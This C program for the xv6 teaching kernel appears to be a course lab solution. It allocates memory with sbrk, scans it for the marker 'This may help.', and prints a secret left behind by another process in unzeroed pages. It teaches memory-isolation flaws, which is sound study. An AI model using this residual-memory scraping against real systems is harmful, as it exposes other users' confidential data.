#include "kernel/types.h"
#include "user/user.h"

#define NBYTES (256 * 1024)

int
main(int argc, char* argv[])
{
  char* p;
  int i;

  p = sbrk(NBYTES);
  if (p == (char*)-1) {
    fprintf(2, "attack: sbrk failed\n");
    exit(1);
  }

  for (i = 0; i < NBYTES - 32; i++) {
    if (memcmp(p + i, "This may help.", 14) == 0) {
      printf("%s\n", p + i + 16);
      exit(0);
    }
  }

  exit(1);
}
